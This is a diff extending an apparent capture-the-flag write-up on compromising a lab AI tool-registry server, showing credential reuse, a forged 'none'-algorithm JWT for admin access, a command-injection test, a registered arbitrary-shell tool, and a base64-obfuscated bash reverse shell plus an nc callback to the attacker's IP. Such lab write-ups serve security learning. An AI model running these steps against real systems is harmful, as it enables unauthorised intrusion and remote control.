@@ -677,7 +677,7 @@ nightfall@fireflow:~$ ls .mcp/
 config.json
 nightfall@fireflow:~$ cat .mcp/config.json 
 {
-  "server": "http://10.129.89.39:30080",
+  "server": "http://10.129.89.142:30080",
   "status_endpoint": "/api/v1/version",
   "user": "langflow-bot",
   "password": "Langfl0w@mcp2026!"
@@ -713,7 +713,7 @@ nightfall@fireflow:~$
 I just got a login and password to another web app, let's reach it with curl:
 
 ```sh
-nightfall@fireflow:~$ curl -s http://10.129.89.39:30080/api/v1/version | jq
+nightfall@fireflow:~$ curl -s http://10.129.89.142:30080/api/v1/version | jq
 {
   "service": "MCP AI Tool Registry",
   "version": "0.1.0",
@@ -737,5 +737,525 @@ nightfall@fireflow:~$
 ```
 
 One interesting thing, we can use `none` as our algorithm, this is a attack vector to escalate our privileges, just editing our JWT and signing it with _none algorithm_.
+
+First of all I need to login in the service, but I don't know the api schema for the authentication endpoint `POST /api/v1/auth`, luckly the endpoint also give us a documentation route, so let's get into it with another curl:
+
+```
+nightfall@fireflow:~$ curl http://10.129.89.142:30080/docs
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
+    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
+    <title>MCP AI Tool Registry — Task Force Nightfall - Swagger UI</title>
+    </head>
+    <body>
+    <div id="swagger-ui">
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
+    <!-- `SwaggerUIBundle` is now available on the page -->
+    <script>
+    const ui = SwaggerUIBundle({
+        url: '/openapi.json',
+    "dom_id": "#swagger-ui",
+"layout": "BaseLayout",
+"deepLinking": true,
+"showExtensions": true,
+"showCommonExtensions": true,
+oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
+    presets: [
+        SwaggerUIBundle.presets.apis,
+        SwaggerUIBundle.SwaggerUIStandalonePreset
+        ],
+    })
+    </script>
+    </body>
+    </html>
+    nightfall@fireflow:~$ 
+```
+
+## Local Port Forwarding through ssh
+
+The [Swagger](https://swagger.io/) UI probably needs to run in a browser, but this host (`10.129.89.142`) isn't accessible by me. 
+
+```
+[11ms][~/Hacking/CTFs/Fireflow] ᛋᛋ ping 10.129.89.142 -c4
+PING 10.129.89.142 (10.129.89.142) 56(84) bytes de dados.
+64 bytes de 10.129.89.142: icmp_seq=1 ttl=63 tempo=148 ms
+64 bytes de 10.129.89.142: icmp_seq=2 ttl=63 tempo=149 ms
+64 bytes de 10.129.89.142: icmp_seq=3 ttl=63 tempo=148 ms
+64 bytes de 10.129.89.142: icmp_seq=4 ttl=63 tempo=148 ms
+
+--- 10.129.89.142 estatísticas de ping ---
+4 pacotes transmitidos, 4 recebidos, 0% packet loss, time 3001ms
+rtt min/avg/max/mdev = 147.587/147.985/148.680/0.440 ms
+[3,165s][~/Hacking/CTFs/Fireflow] ᛋᛋ nc -vz -w 5 10.129.89.142 30080
+nc: connect to 10.129.89.142 port 30080 (tcp) timed out: Operation now in progress
+[5,026s][1][~/Hacking/CTFs/Fireflow] ᛋᛋ 
+```
+
+The port is probably binded to `127.0.0.1` or firewalled to deny external connections. I already have ssh access to the `nightfall` user, so I just need to forward the `30080` port through ssh:
+
+```
+[10ms][~/Hacking/CTFs/Fireflow] ᛋᛋ ssh -N -L 51337:127.0.0.1:30080 nightfall@fireflow.htb
+nightfall@fireflow.htb's password: 
+^Z
+[1]  + 23087 suspended  ssh -N -L 51337:127.0.0.1:30080 nightfall@fireflow.htb
+[6,003s][148][~/Hacking/CTFs/Fireflow] ᛋᛋ bg
+[1]  + 23087 continued  ssh -N -L 51337:127.0.0.1:30080 nightfall@fireflow.htb
+[12ms][~/Hacking/CTFs/Fireflow] ᛋᛋ 
+```
+
+Now I can connect to the swagger using my own browser:
+
+![[Fireflow - MCP AI Tool Registry Swagger.png]]
+
+I could have opened openapi.json as well, but a clean UI in my browser is much friendly and easier to use, but if you want it, you just need to run this curl (and don't even need to do port forwarding):
+
+```
+nightfall@fireflow:~$ curl http://10.129.89.142:30080/openapi.json -s | jq
+{
+  "openapi": "3.1.0",
+  "info": {
+    "title": "MCP AI Tool Registry — Task Force Nightfall",
+    "version": "0.1.0"
+  },
+  --- MORE DATA ---
+}
+nightfall@fireflow:~$ 
+```
+
+## Authenticating in service
+
+The schema for the endpoint `POST /api/v1/auth` is:
+
+```json
+{
+  "username": "string",
+  "password": "string"
+}
+```
+
+So I just needed to curl with `-X` set to `POST` and pass the leaked credentials with `--d`:
+
+```
+nightfall@fireflow:~$ curl -X 'POST'   'http://10.129.89.142:30080/api/v1/auth'   -H 'accept: application/json'   -H 'Content-Type: application/json'   -d '{
+  "username": "langflow-bot",
+  "password": "Langfl0w@mcp2026!"
+}' -s | jq
+{
+  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
+  "token_type": "bearer"
+}
+nightfall@fireflow:~$ 
+```
+
+## JWT Compromise
+
+After decoding the given Json Web Token (aka jwt), I discovered it's content:
+
+```json
+Header:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+Payload:
+{
+  "sub": "langflow-bot",
+  "role": "user"
+}
+```
+
+I obviously just edited this (in [jwt.io](https://www.jwt.io/)) to use the `none` algorithm and escalate my privileges to `"role": "admin"`. After this I devilered this request to see if nothing breaks:
+
+```
+nightfall@fireflow:~$ curl http://10.129.89.142:30080/api/v1/tools -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' -s | jq
+[
+  {
+    "name": "ping_host",
+    "description": "Ping a target host 3 times and return ICMP output."
+  },
+  {
+    "name": "get_metrics_summary",
+    "description": "Return a summary of system memory and load average from /proc."
+  },
+  {
+    "name": "list_running_tasks",
+    "description": "List the top 20 running processes sorted by CPU usage."
+  }
+]
+nightfall@fireflow:~$
+```
+
+Everything seens good, but as the swagger docs let me know, this endpoint don't require authentication.
+
+## Shell through the Ping Tool
+
+Before creating a custom tool, I decided to test the `ping_host` protocol, because if the `host` was directly concatenated into a `bash -c 'ping -c4 $host'`, I would be able to send a `host` like `127.0.0.1;id` to run commands directly into bash.
+
+To exploit this possibility, I asked for my partner (aka claude) to create a python that interacts with MCP through CLI, and he gave me this:
+
+```python
+# /// script
+# dependencies = [
+#     "httpx",
+# ]
+# ///
+
+import httpx
+import json
+import argparse
+import sys
+
+# --- HARDCODED CONFIG ---
+TOKEN_BEARER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ."
+
+def run_mcp_flow(url, method_mcp, params_mcp):
+    """Manages the MCP lifecycle and executes the requested command."""
+    base_headers = {
+        "Authorization": f"Bearer {TOKEN_BEARER}",
+        "Content-Type": "application/json"
+    }
+
+    with httpx.Client(headers=base_headers) as client:
+        # 1. Required step: Initialization handshake
+        init_payload = {
+            "jsonrpc": "2.0",
+            "id": 1,
+            "method": "initialize",
+            "params": {
+                "protocolVersion": "2026-07-28",
+                "capabilities": {},
+                "clientInfo": {"name": "mcp-argparse-cli", "version": "1.0.0"}
+            }
+        }
+
+        try:
+            response = client.post(url, json=init_payload, timeout=10.0)
+        except Exception as e:
+            print(f"❌ Connection error with server: {e}", file=sys.stderr)
+            sys.exit(1)
+
+        if response.status_code != 200:
+            print(f"❌ Initial handshake failed (Status {response.status_code}):", file=sys.stderr)
+            print(response.text, file=sys.stderr)
+            sys.exit(1)
+
+        response_data = response.json()
+
+        # Capture the required session ID
+        session_id = response.headers.get("Mcp-Session-Id")
+        if not session_id and "params" in response_data:
+            session_id = response_data["params"].get("sessionId")
+
+        request_headers = base_headers.copy()
+        if session_id:
+            request_headers["Mcp-Session-Id"] = session_id
+
+        # 2. Required step: Initialization confirmation
+        conf_payload = {
+            "jsonrpc": "2.0",
+            "method": "notifications/initialized"
+        }
+        client.post(url, json=conf_payload, headers=request_headers)
+
+        # 3. Execute the user's action
+        final_payload = {
+            "jsonrpc": "2.0",
+            "id": 2,
+            "method": method_mcp,
+            "params": params_mcp
+        }
+
+        action_res = client.post(url, json=final_payload, headers=request_headers)
+        return action_res.json()
+
+def main():
+    parser = argparse.ArgumentParser(description="Standalone CLI client for authenticated MCP endpoints.")
+    parser.add_argument("--url", default="http://localhost:51337/mcp", help="MCP endpoint URL (Default: http://localhost:51337/mcp)")
+
+    subparsers = parser.add_subparsers(dest="subcommand", required=True, help="Available subcommands")
+
+    # Subcommand: list
+    subparsers.add_parser("list", help="Lists all tools available at the endpoint")
+
+    # Subcommand: call
+    parser_call = subparsers.add_parser("call", help="Executes a specific tool")
+    parser_call.add_argument("name", help="Name of the tool to execute")
+    parser_call.add_argument("--args", default="{}", help="Tool arguments as a JSON string (Ex: '{\"param\": \"value\"}')")
+
+    args = parser.parse_args()
+
+    if args.subcommand == "list":
+        print(f"🔍 Fetching tools at: {args.url}...")
+        result = run_mcp_flow(args.url, "tools/list", {})
+        print(json.dumps(result, indent=2, ensure_ascii=False))
+
+    elif args.subcommand == "call":
+        try:
+            args_json = json.loads(args.args)
+        except json.JSONDecodeError:
+            print("❌ Error: The value passed to `--args` is not valid JSON.", file=sys.stderr)
+            print("Correct example: --args '{\"city\": \"São Paulo\"}'", file=sys.stderr)
+            sys.exit(1)
+
+        print(f"🚀 Running tool '{args.name}' at: {args.url}...")
+        params_payload = {
+            "name": args.name,
+            "arguments": args_json
+        }
+        result = run_mcp_flow(args.url, "tools/call", params_payload)
+        print(json.dumps(result, indent=2, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+This can be executed using [`uv`](https://docs.astral.sh/uv/) (because I'm on arch, and can't just install a pip package, and honestly I hate managing virtual environments for python everytime that I need to run something).
+
+```
+[12ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py --help                                            
+usage: mcp-cli.py [-h] [--url URL] {list,call} ...
+
+Standalone CLI client for authenticated MCP endpoints.
+
+positional arguments:
+  {list,call}  Available subcommands
+    list       Lists all tools available at the endpoint
+    call       Executes a specific tool
+
+options:
+  -h, --help   show this help message and exit
+  --url URL    MCP endpoint URL (Default: http://localhost:51337/mcp)
+[220ms][~/Hacking/Tools] ᛋᛋ 
+```
+
+Firstly I enumerated the available tools, because the `GET /api/v1/tools` didn't gave me the parameters:
+
+```json
+[220ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py list  
+🔍 Fetching tools at: http://localhost:51337/mcp...
+{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "result": {
+    "tools": [
+      {
+        "name": "ping_host",
+        "description": "Ping a target host 3 times and return ICMP output.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "target": {
+              "type": "string",
+              "description": "IP address or hostname to ping"
+            }
+          },
+          "required": [
+            "target"
+          ]
+        }
+      },
+      {
+        "name": "get_metrics_summary",
+        "description": "Return a summary of system memory and load average from /proc.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {}
+        }
+      },
+      {
+        "name": "list_running_tasks",
+        "description": "List the top 20 running processes sorted by CPU usage.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {}
+        }
+      }
+    ]
+  }
+}
+[828ms][~/Hacking/Tools] ᛋᛋ 
+```
+
+With this, I can build a malicious request to the `ping_host` tool:
+
+```json
+[10ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py call ping_host --args '{"target": "127.0.0.1;id"}'
+🚀 Running tool 'ping_host' at: http://localhost:51337/mcp...
+{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "\n\nping: 127.0.0.1;id: Name or service not known\n\n"
+      }
+    ],
+    "isError": false
+  }
+}
+[0,892s][~/Hacking/Tools] ᛋᛋ 
+```
+
+Unfortunately, this didn't work, the tool is probably using `execv` directly to `/usr/bin/ping` with accurate concatenation.
+
+## Exploiting Tool Creation
+
+To build the tool creation payload, I used the swagger UI (under `GET /docs`) to create this curl command:
+
+```
+curl -X 'POST' \
+  'http://localhost:30080/api/v1/tools' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' \
+  -H 'Content-Type: application/json' \
+  -d '{
+  "name": "shell",
+  "description": "Executes shell commands on the host system and returns the combined stdout and stderr output.",
+  "inputSchema": {
+    "type": "object",
+    "properties": {
+      "cmd": {
+        "type": "string",
+        "description": "The exact shell command to execute."
+      }
+    },
+    "required": ["cmd"]
+  },
+  "code": "import subprocess as s\n\ndef shell(cmd: str) -> str:\n    r = s.run(['\''/bin/bash'\'', '\''-c'\'', cmd], stdout=s.PIPE, stderr=s.STDOUT, text=True)\n    return r.stdout"
+}'
+```
+
+I just ran it:
+
+```
+nightfall@fireflow:~$ curl -X 'POST' \
+  'http://localhost:30080/api/v1/tools' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' \
+  -H 'Content-Type: application/json' \
+  -d '{
+  "name": "shell",
+  "description": "Executes shell commands on the host system and returns the combined stdout and stderr output.",
+  "inputSchema": {
+    "type": "object",
+    "properties": {
+      "cmd": {
+        "type": "string",
+        "description": "The exact shell command to execute."
+      }
+    },
+    "required": ["cmd"]
+  },
+  "code": "import subprocess as s\n\ndef shell(cmd: str) -> str:\n    r = s.run(['\''/bin/bash'\'', '\''-c'\'', cmd], stdout=s.PIPE, stderr=s.STDOUT, text=True)\n    return r.stdout"
+}'
+{"status":"registered","name":"shell"}nightfall@fireflow:~$ 
+```
+
+Now I just list again with my cli:
+
+```
+[4ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py list                                              
+🔍 Fetching tools at: http://localhost:51337/mcp...
+{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "result": {
+    "tools": [
+      <-- OTHER TOOLS -->
+      {
+        "name": "shell",
+        "description": "Executes shell commands on the host system and returns the combined stdout and stderr output.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "cmd": {
+              "type": "string",
+              "description": "The exact shell command to execute."
+            }
+          },
+          "required": [
+            "cmd"
+          ]
+        }
+      }
+    ]
+  }
+}
+[0,922s][~/Hacking/Tools] ᛋᛋ 
+```
+
+Now I run it:
+
+```
+[0,844s][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py call shell --args '{"cmd": "ls"}'
+🚀 Running tool 'shell' at: http://localhost:51337/mcp...
+{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": ""
+      }
+    ],
+    "isError": false
+  }
+}
+[0,893s][~/Hacking/Tools] ᛋᛋ 
+```
+
+Ops, it seems like nothing happened, I don't know if the mcp just don't returns the output or if it just didn't ran. To check it, I just tried (firstly) sending a reverse shell:
+
+```
+[788ms][~/Hacking/Tools] ᛋᛋ uv run /tmp/mcp-cli.py call shell --args '{"cmd": "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTYwLzQ0NDQgMD4mMSkgJg==|base64 -d|bash"}'
+🚀 Running tool 'shell' at: http://localhost:51337/mcp...
+{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": ""
+      }
+    ],
+    "isError": false
+  }
+}
+[0,852s][~/Hacking/Tools] ᛋᛋ 
+```
+
+Nothing happened, I'll create a raw tool with just properties, just a connection to my PC. First I need to check for `nc` in the host:
+
+```
+nightfall@fireflow:~$ which nc
+/usr/bin/nc
+nightfall@fireflow:~$ 
+```
+
+Alright, now I just send this:
+
+```json
+{
+  "name": "ping_me",
+  "description": "Ping my device",
+  "properties": {},
+  "code": "import subprocess as s;s.run(['/usr/bin/nc', '-vz', '-w', '5', '10.10.15.160', '4445'], stdout=s.PIPE, stderr=s.STDOUT, text=True)"
+}
+```
+
+If this successfully connect to my machine, I'll know that I can just send a reverse shell to me. Now I run the curl registry (through swagger, it's easier) and:
+
+```json
+{ "status": "registered", "name": "ping_me" }
+```
 
 ---
